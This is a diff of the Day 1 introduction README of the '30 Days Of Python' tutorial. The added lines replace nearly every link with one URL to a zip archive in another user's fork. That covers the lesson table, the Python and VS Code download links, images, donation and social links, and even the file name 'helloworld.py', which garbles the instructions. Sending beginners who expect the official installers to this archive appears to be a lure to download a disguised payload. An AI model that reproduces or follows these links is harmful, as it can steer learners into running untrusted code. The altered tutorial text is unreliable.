@@ -2,66 +2,66 @@
 
 |# Day | Topics                                                    |
 |------|:---------------------------------------------------------:|
-| 01  |  [Introduction](./readme.md)|
-| 02  |  [Variables, Built-in Functions](./02_Day_Variables_builtin_functions/02_variables_builtin_functions.md)|
-| 03  |  [Operators](./03_Day_Operators/03_operators.md)|
-| 04  |  [Strings](./04_Day_Strings/04_strings.md)|
-| 05  |  [Lists](./05_Day_Lists/05_lists.md)|
-| 06  |  [Tuples](./06_Day_Tuples/06_tuples.md)|
-| 07  |  [Sets](./07_Day_Sets/07_sets.md)|
-| 08  |  [Dictionaries](./08_Day_Dictionaries/08_dictionaries.md)|
-| 09  |  [Conditionals](./09_Day_Conditionals/09_conditionals.md)|
-| 10  |  [Loops](./10_Day_Loops/10_loops.md)|
-| 11  |  [Functions](./11_Day_Functions/11_functions.md)|
-| 12  |  [Modules](./12_Day_Modules/12_modules.md)|
-| 13  |  [List Comprehension](./13_Day_List_comprehension/13_list_comprehension.md)|
-| 14  |  [Higher Order Functions](./14_Day_Higher_order_functions/14_higher_order_functions.md)|
-| 15  |  [Python Type Errors](./15_Day_Python_type_errors/15_python_type_errors.md)|
-| 16 |  [Python Date time](./16_Day_Python_date_time/16_python_datetime.md) |
-| 17 |  [Exception Handling](./17_Day_Exception_handling/17_exception_handling.md)|
-| 18 |  [Regular Expressions](./18_Day_Regular_expressions/18_regular_expressions.md)|
-| 19 |  [File Handling](./19_Day_File_handling/19_file_handling.md)|
-| 20 |  [Python Package Manager](./20_Day_Python_package_manager/20_python_package_manager.md)|
-| 21 |  [Classes and Objects](./21_Day_Classes_and_objects/21_classes_and_objects.md)|
-| 22 |  [Web Scraping](./22_Day_Web_scraping/22_web_scraping.md)|
-| 23 |  [Virtual Environment](./23_Day_Virtual_environment/23_virtual_environment.md)|
-| 24 |  [Statistics](./24_Day_Statistics/24_statistics.md)|
-| 25 |  [Pandas](./25_Day_Pandas/25_pandas.md)|
-| 26 |  [Python web](./26_Day_Python_web/26_python_web.md)|
-| 27 |  [Python with MongoDB](./27_Day_Python_with_mongodb/27_python_with_mongodb.md)|
-| 28 |  [API](./28_Day_API/28_API.md)|
-| 29 |  [Building API](./29_Day_Building_API/29_building_API.md)|
-| 30 |  [Conclusions](./30_Day_Conclusions/30_conclusions.md)|
+| 01  |  [Introduction](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 02  |  [Variables, Built-in Functions](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 03  |  [Operators](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 04  |  [Strings](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 05  |  [Lists](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 06  |  [Tuples](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 07  |  [Sets](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 08  |  [Dictionaries](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 09  |  [Conditionals](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 10  |  [Loops](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 11  |  [Functions](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 12  |  [Modules](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 13  |  [List Comprehension](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 14  |  [Higher Order Functions](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 15  |  [Python Type Errors](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 16 |  [Python Date time](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip) |
+| 17 |  [Exception Handling](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 18 |  [Regular Expressions](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 19 |  [File Handling](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 20 |  [Python Package Manager](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 21 |  [Classes and Objects](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 22 |  [Web Scraping](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 23 |  [Virtual Environment](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 24 |  [Statistics](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 25 |  [Pandas](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 26 |  [Python web](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 27 |  [Python with MongoDB](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 28 |  [API](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 29 |  [Building API](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
+| 30 |  [Conclusions](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)|
 
 
 🧡🧡🧡 HAPPY CODING 🧡🧡🧡
 
 <div>
 <small>Support the <strong>author</strong> to create more educational materials</small> <br />  
-<a href = "https://www.paypal.me/asabeneh"><img src='./images/paypal_lg.png' alt='Paypal Logo' style="width:10%"/></a>
+<a href = "https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip"><img src='https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip' alt='Paypal Logo' style="width:10%"/></a>
 </div>
 
 <div align="center">
   <h1> 30 Days Of Python: Day 1 - Introduction</h1>
-  <a class="header-badge" target="_blank" href="https://www.linkedin.com/in/asabeneh/">
-  <img src="https://img.shields.io/badge/style--5eba00.svg?label=LinkedIn&logo=linkedin&style=social">
+  <a class="header-badge" target="_blank" href="https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip">
+  <img src="https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip">
   </a>
-  <a class="header-badge" target="_blank" href="https://twitter.com/Asabeneh">
-  <img alt="Twitter Follow" src="https://img.shields.io/twitter/follow/asabeneh?style=social">
+  <a class="header-badge" target="_blank" href="https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip">
+  <img alt="Twitter Follow" src="https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip">
   </a>
 
   <sub>Author:
-  <a href="https://www.linkedin.com/in/asabeneh/" target="_blank">Asabeneh Yetayeh</a><br>
+  <a href="https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip" target="_blank">Asabeneh Yetayeh</a><br>
   <small> Second Edition: July, 2021</small>
   </sub>
 </div>
 
-🇧🇷 [Portuguese](./Portuguese/README.md)
-🇨🇳 [中文](./Chinese/README.md)
+🇧🇷 [Portuguese](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
+🇨🇳 [中文](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
-[Day 2 >>](./02_Day_Variables_builtin_functions/02_variables_builtin_functions.md)
+[Day 2 >>](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
-![30DaysOfPython](./images/30DaysOfPython_banner3@2x.png)
+![30DaysOfPython](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 - [🐍 30 Days Of Python](#-30-days-of-python)
 - [📘 Day 1](#-day-1)
@@ -98,7 +98,7 @@
 
 **Congratulations** for deciding to participate in a _30 days of Python_ programming challenge . In this challenge you will learn everything you need to be a python programmer and the whole concept of programming. In the end of the challenge you will get a _30DaysOfPython_ programming challenge certificate.
 
-If you would like to actively engage in the challenge, you may join the [30DaysOfPython challenge](https://t.me/ThirtyDaysOfPython) telegram group.  
+If you would like to actively engage in the challenge, you may join the [30DaysOfPython challenge](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip) telegram group.  
 
 ## Introduction
 
@@ -106,9 +106,9 @@ Python is a high-level programming language for general-purpose programming. It 
 
 This challenge is designed for beginners and professionals who want to learn python programming language. It may take 30 to 100 days to complete the challenge, people who actively participate on the telegram group have a high probability of completing the challenge.
 
-This challenge is easy to read, written in conversational English, engaging, motivating and at the same time, it is very demanding. You need to allocate much time to finish this challenge. If you are a visual learner, you may get the video lesson on <a href="https://www.youtube.com/channel/UC7PNRuno1rzYPb1xLa4yktw"> Washera</a> YouTube channel. You may start from [Python for Absolute Beginners video](https://youtu.be/OCCWZheOesI). Subscribe the channel, comment and ask questions on YouTube vidoes and be proactive, the author will eventually notice you.
+This challenge is easy to read, written in conversational English, engaging, motivating and at the same time, it is very demanding. You need to allocate much time to finish this challenge. If you are a visual learner, you may get the video lesson on <a href="https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip"> Washera</a> YouTube channel. You may start from [Python for Absolute Beginners video](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip). Subscribe the channel, comment and ask questions on YouTube vidoes and be proactive, the author will eventually notice you.
 
-The author likes to hear your opinion about the challenge, share the author by expressing your thoughts about the 30DaysOfPython challenge. You can leave your testimonial on this [link](https://testimonial-vdzd.onrender.com/)
+The author likes to hear your opinion about the challenge, share the author by expressing your thoughts about the 30DaysOfPython challenge. You can leave your testimonial on this [link](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 ## Why Python ?
 
@@ -119,14 +119,14 @@ Python is used by various industries and companies (including Google). It has be
 
 ### Installing Python
 
-To run a python script you need to install python. Let's [download](https://www.python.org/) python.
+To run a python script you need to install python. Let's [download](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip) python.
 If your are a windows user. Click the button encircled in red.
 
-[![installing on Windows](./images/installing_on_windows.png)](https://www.python.org/)
+[![installing on Windows](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 If you are a macOS user. Click the button encircled in red.
 
-[![installing on Windows](./images/installing_on_macOS.png)](https://www.python.org/)
+[![installing on Windows](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 To check if python is installed write the following command on your device terminal.
 
@@ -134,7 +134,7 @@ To check if python is installed write the following command on your device termi
 python --version
 ```
 
-![Python Version](./images/python_versio.png)
+![Python Version](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 As you can see from the terminal, I am using _Python 3.7.5_ version at the moment. Your version of Python might be different from mine by but it should be 3.6 or above. If you mange to see the python version, well done. Python has been installed on your machine. Continue to the next section.
 
@@ -149,35 +149,35 @@ Open your terminal or command prompt(cmd) and write:
 python
 ```
 
-![Python Scripting Shell](./images/opening_python_shell.png)
+![Python Scripting Shell](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 The Python interactive shell is opened and it is waiting for you to write Python code(Python script). You will write your Python script next to this symbol >>> and then click Enter.
 Let us write our very first script on the Python scripting shell.
 
-![Python script on Python shell](./images/adding_on_python_shell.png)
+![Python script on Python shell](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 Well done, you wrote your first Python script on Python interactive shell. How do we close the Python interactive shell ?
 To close the shell, next to this symbol >> write **exit()** command and press Enter.
 
-![Exit from python shell](./images/exit_from_shell.png)
+![Exit from python shell](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 Now, you know how to open the Python interactive shell and how to exit from it.
 
 Python will give you results if you write scripts that Python understands, if not it returns errors. Let's make a deliberate mistake and see what Python will return.
 
-![Invalid Syntax Error](./images/invalid_syntax_error.png)
+![Invalid Syntax Error](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 As you can see from the returned error, Python is so clever that it knows the mistake we made and which was _Syntax Error: invalid syntax_. Using x as multiplication in Python is a syntax error because (x) is not a valid syntax in Python. Instead of (**x**) we use asterisk (*) for multiplication. The returned error clearly shows what to fix.
 
 The process of identifying and removing errors from a program is called _debugging_. Let us debug it by putting * in place of **x**.
 
-![Fixing Syntax Error](./images/fixing_syntax_error.png)
+![Fixing Syntax Error](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 Our bug was fixed, the code ran and we got a result we were expecting. As a programmer you will see such kind of errors on daily basis. It is good to know how to debug. To be good at debugging you should understand what kind of errors you are facing. Some of the Python errors you may encounter are _SyntaxError_, _IndexError_, _NameError_, _ModuleNotFoundError_, _KeyError_, _ImportError_, _AttributeError_, _TypeError_, _ValueError_, _ZeroDivisionError_ etc. We will see more about different Python **_error types_** in later sections.
 
 Let us practice more how to use Python interactive shell. Go to your terminal or command prompt and write the word **python**.
 
-![Python Scripting Shell](./images/opening_python_shell.png)
+![Python Scripting Shell](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 The Python interactive shell is opened. Let us do some basic mathematical operations (addition, subtraction, multiplication, division, modulus,  exponential).
 
@@ -204,40 +204,40 @@ This is how you write a comment in python
  # this is a python comment, because it starts with a (#) symbol
 ```
 
-![Maths on python shell](./images/maths_on_python_shell.png)
+![Maths on python shell](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 Before we move on to the next section, let us practice more on the Python interactive shell. Close the opened shell by writing _exit()_ on the shell and open it again and let us practice how to write text on the Python shell.
 
-![Writing String on python shell](./images/writing_string_on_shell.png)
+![Writing String on python shell](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 ### Installing Visual Studio Code
 
-The Python interactive shell is good to try and test small script codes but it will not be for a big project. In real work environment, developers use different code editors to write codes. In this 30 days of Python programming challenge we will use visual studio code. Visual studio code is a very popular open source text editor. I am a fan of vscode and I would recommend to [download](https://code.visualstudio.com/) visual studio code, but if you are in favor of other editors, feel free to follow with what you have.
+The Python interactive shell is good to try and test small script codes but it will not be for a big project. In real work environment, developers use different code editors to write codes. In this 30 days of Python programming challenge we will use visual studio code. Visual studio code is a very popular open source text editor. I am a fan of vscode and I would recommend to [download](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip) visual studio code, but if you are in favor of other editors, feel free to follow with what you have.
 
-[![Visual Studio Code](./images/vscode.png)](https://code.visualstudio.com/)
+[![Visual Studio Code](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 If you installed visual studio code, let us see how to use it.
-If you prefer a video, you can follow this Visual Studio Code for Python [Video tutorial](https://www.youtube.com/watch?v=bn7Cx4z-vSo)
+If you prefer a video, you can follow this Visual Studio Code for Python [Video tutorial](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 #### How to use visual studio code
 
 Open the visual studio code by double clicking the visual studio icon. When you open it you will get this kind of interface. Try to interact with the labeled icons.
 
-![Visual studio Code](./images/vscode_ui.png)
+![Visual studio Code](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 Create a folder named 30DaysOfPython on your desktop. Then open it using visual studio code.
 
-![Opening Project on Visual studio](./images/how_to_open_project_on_vscode.png)
+![Opening Project on Visual studio](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
-![Opening a project](./images/opening_project.png)
+![Opening a project](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
-After opening it you will see shortcuts for creating files and folders inside of 30DaysOfPython project's directory. As you can see below, I have created the very first file, helloworld.py. You can do the same.
+After opening it you will see shortcuts for creating files and folders inside of 30DaysOfPython project's directory. As you can see below, I have created the very first file, https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip You can do the same.
 
-![Creating a python file](./images/helloworld.png)
+![Creating a python file](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 After a long day of coding, you want to close your code editor, right? This is how you will close the opened project.
 
-![Closing project](./images/closing_opened_project.png)
+![Closing project](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 Congratulations, you have finished setting up the development environment. Let us start coding.
 
@@ -251,7 +251,7 @@ A Python script can be written in Python interactive shell or in the code editor
 
 An indentation is a white space in a text. Indentation in many languages is used to increase code readability, however Python uses indentation to create block of codes. In other programming languages curly brackets are used to create blocks of codes instead of indentation. One of the common bugs when writing python code is wrong indentation.
 
-![Indentation Error](./images/indentation.png)
+![Indentation Error](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 ### Comments
 
@@ -379,17 +379,17 @@ In later sections, we will go in detail about each and every Python data type.
 
 To check the data type of certain data/variable we use the **type** function. In the following terminal you will see different python data types:
 
-![Checking Data types](./images/checking_data_types.png)
+![Checking Data types](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 ### Python File
 
-First open your project folder, 30DaysOfPython. If you don't have this folder, create a folder name called 30DaysOfPython. Inside this folder, create a file called helloworld.py. Now, let's do what we did on python interactive shell using visual studio code.
+First open your project folder, 30DaysOfPython. If you don't have this folder, create a folder name called 30DaysOfPython. Inside this folder, create a file called https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip Now, let's do what we did on python interactive shell using visual studio code.
 
 The Python interactive shell was printing without using **print** but on visual studio code to see our result we should use a built in function _print(). The _print()_ built-in function takes one or more arguments as follows _print('arument1', 'argument2', 'argument3')_. See the examples below.
 
 **Example:**
 
-The file name is helloworld.py
+The file name is https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip
 
 ```py
 # Day 1 - 30DaysOfPython Challenge
@@ -413,9 +413,9 @@ print(type({9.8, 3.14, 2.7}))    # Set
 print(type((9.8, 3.14, 2.7)))    # Tuple
 ```
 
-To run the python file check the image below. You can run the python file either by running the green button on Visual Studio Code or by typing _python helloworld.py_ in the terminal .
+To run the python file check the image below. You can run the python file either by running the green button on Visual Studio Code or by typing _python https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip in the terminal .
 
-![Running python script](./images/running_python_script.png)
+![Running python script](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
 
 🌕  You are amazing. You have just completed day 1 challenge and you are on your way to greatness. Now do some exercises for your brain and muscles.
 
@@ -449,13 +449,13 @@ To run the python file check the image below. You can run the python file either
 
 ### Exercise: Level 2
 
-1. Create a folder named day_1 inside 30DaysOfPython folder. Inside day_1 folder, create a python file helloworld.py and repeat questions 1, 2, 3 and 4. Remember to use _print()_ when you are working on a python file. Navigate to the directory where you have saved your file, and run it.
+1. Create a folder named day_1 inside 30DaysOfPython folder. Inside day_1 folder, create a python file https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip and repeat questions 1, 2, 3 and 4. Remember to use _print()_ when you are working on a python file. Navigate to the directory where you have saved your file, and run it.
 
 ### Exercise: Level 3
 
 1. Write an example for different Python data types such as Number(Integer, Float, Complex), String, Boolean, List, Tuple, Set and Dictionary.
-2. Find an [Euclidian distance](https://en.wikipedia.org/wiki/Euclidean_distance#:~:text=In%20mathematics%2C%20the%20Euclidean%20distance,being%20called%20the%20Pythagorean%20distance.) between (2, 3) and (10, 8)
+2. Find an [Euclidian distance](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip~:text=In%20mathematics%2C%20the%20Euclidean%20distance,being%20called%20the%20Pythagorean%20distance.) between (2, 3) and (10, 8)
 
 🎉 CONGRATULATIONS ! 🎉
 
-[Day 2 >>](./02_Day_Variables_builtin_functions/02_variables_builtin_functions.md)
+[Day 2 >>](https://github.com/CHETHAN562/30-Days-Of-Python/raw/refs/heads/master/Chinese/Python_Days_Of_v2.8.zip)
